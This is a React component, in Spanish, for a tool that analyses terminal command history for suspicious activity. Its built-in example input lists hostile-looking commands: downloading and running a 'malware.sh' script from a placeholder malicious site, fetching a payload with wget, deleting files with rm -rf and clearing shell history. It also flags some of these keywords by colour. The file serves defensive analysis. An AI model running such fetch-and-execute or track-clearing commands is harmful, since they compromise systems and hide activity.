import React, { useState } from 'react';
import { useAnalysis } from '../../context/AnalysisContext';
import { analysisService, apiUtils } from '../../services/api';
import {
    DocumentTextIcon,
    PlayIcon,
    ClipboardDocumentIcon,
    TrashIcon,
    InformationCircleIcon
} from '@heroicons/react/24/outline';

const TextInput = () => {
    const {
        setLoading,
        setAnalysisResult,
        setError,
        setLastAnalyzedFile
    } = useAnalysis();

    const [content, setContent] = useState('');
    const [isAnalyzing, setIsAnalyzing] = useState(false);

    const exampleCommands = `cd /home/user
ls -la
sudo rm -rf /tmp/*
curl -o malware.sh http://malicious-site.com/script.sh
chmod +x malware.sh
./malware.sh
ssh root@192.168.1.100
wget https://suspicious-domain.com/payload
history -c`;

    const handleAnalyze = async () => {
        if (!content.trim()) {
            setError('Por favor, ingresa algunos comandos para analizar');
            return;
        }

        try {
            apiUtils.validateContent(content);

            setIsAnalyzing(true);
            setLoading(true);

            const result = await analysisService.analyzeText(content, 'Texto directo');
            setAnalysisResult(result);
            setLastAnalyzedFile({ name: 'Análisis de texto directo' });

        } catch (error) {
            setError(error.message || 'Error al analizar el texto');
        } finally {
            setIsAnalyzing(false);
            setLoading(false);
        }
    };

    const handleClear = () => {
        setContent('');
        setError(null);
    };

    const handleLoadExample = () => {
        setContent(exampleCommands);
        setError(null);
    };

    const handlePasteFromClipboard = async () => {
        try {
            const text = await navigator.clipboard.readText();
            setContent(text);
            setError(null);
        } catch (error) {
            setError('No se pudo acceder al portapapeles. Pega el contenido manualmente.');
        }
    };

    const lineCount = content.split('\n').filter(line => line.trim()).length;
    const charCount = content.length;
    const isValid = content.trim().length > 0;

    return (
        <div className="space-y-4">
            {/* Text Area */}
            <div className="relative">
                <label htmlFor="command-input" className="block text-sm font-medium text-gray-700 mb-2">
                    Comandos de terminal
                </label>
                <textarea
                    id="command-input"
                    value={content}
                    onChange={(e) => setContent(e.target.value)}
                    placeholder="Pega tus comandos aquí, uno por línea..."
                    className="w-full h-64 p-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 font-mono text-sm resize-none"
                    disabled={isAnalyzing}
                />

                {/* Character count */}
                <div className="absolute bottom-2 right-2 text-xs text-gray-500 bg-white px-2 py-1 rounded">
                    {lineCount} líneas • {charCount} caracteres
                </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-wrap gap-2">
                <button
                    onClick={handleAnalyze}
                    disabled={!isValid || isAnalyzing}
                    className="btn-primary flex-1 min-w-0"
                >
                    <PlayIcon className="h-4 w-4 mr-2" />
                    {isAnalyzing ? 'Analizando...' : 'Analizar Comandos'}
                </button>

                <button
                    onClick={handlePasteFromClipboard}
                    disabled={isAnalyzing}
                    className="btn-secondary"
                    title="Pegar desde portapapeles"
                >
                    <ClipboardDocumentIcon className="h-4 w-4" />
                </button>

                <button
                    onClick={handleClear}
                    disabled={isAnalyzing || !content}
                    className="btn-secondary"
                    title="Limpiar texto"
                >
                    <TrashIcon className="h-4 w-4" />
                </button>
            </div>

            {/* Example Commands */}
            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                <div className="flex items-center justify-between mb-3">
                    <h4 className="font-medium text-gray-900 flex items-center">
                        <DocumentTextIcon className="h-4 w-4 mr-2" />
                        Comandos de ejemplo
                    </h4>
                    <button
                        onClick={handleLoadExample}
                        disabled={isAnalyzing}
                        className="text-sm text-primary-600 hover:text-primary-700 font-medium"
                    >
                        Cargar ejemplo
                    </button>
                </div>

                <div className="bg-gray-900 rounded p-3 text-green-400 font-mono text-xs overflow-x-auto">
                    {exampleCommands.split('\n').map((line, index) => (
                        <div key={index} className={`${
                            line.includes('rm -rf') || line.includes('chmod +x') || line.includes('./') ? 'text-red-400' :
                                line.includes('curl') || line.includes('wget') || line.includes('ssh') ? 'text-orange-400' :
                                    'text-green-400'
                        }`}>
                            <span className="text-gray-500">$ </span>
                            {line}
                        </div>
                    ))}
                </div>
            </div>

            {/* Tips */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <h4 className="font-medium text-blue-900 mb-2 flex items-center">
                    <InformationCircleIcon className="h-4 w-4 mr-2" />
                    Consejos para el análisis de texto
                </h4>
                <ul className="text-sm text-blue-800 space-y-1">
                    <li>• Incluye un comando por línea</li>
                    <li>• Los comentarios (líneas que empiezan con #) se ignorarán</li>
                    <li>• Puedes pegar directamente desde tu historial de terminal</li>
                    <li>• Las líneas vacías se filtrarán automáticamente</li>
                    <li>• El análisis detectará pipes, redirecciones y flags automáticamente</li>
                </ul>
            </div>

            {/* Common Commands Reference */}
            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                <h4 className="font-medium text-gray-900 mb-2">
                    Comandos para obtener tu historial:
                </h4>
                <div className="space-y-2">
                    <div className="bg-gray-900 rounded p-2 text-green-400 font-mono text-sm">
                        <div><span className="text-gray-500">$ </span>history</div>
                    </div>
                    <div className="bg-gray-900 rounded p-2 text-green-400 font-mono text-sm">
                        <span className="text-gray-500">$ </span>cat ~/.bash_history
                    </div>
                    <div className="bg-gray-900 rounded p-2 text-green-400 font-mono text-sm">
                        <span className="text-gray-500">$ </span>cat ~/.zsh_history
                    </div>
                </div>
            </div>
        </div>
    );
};

export default TextInput;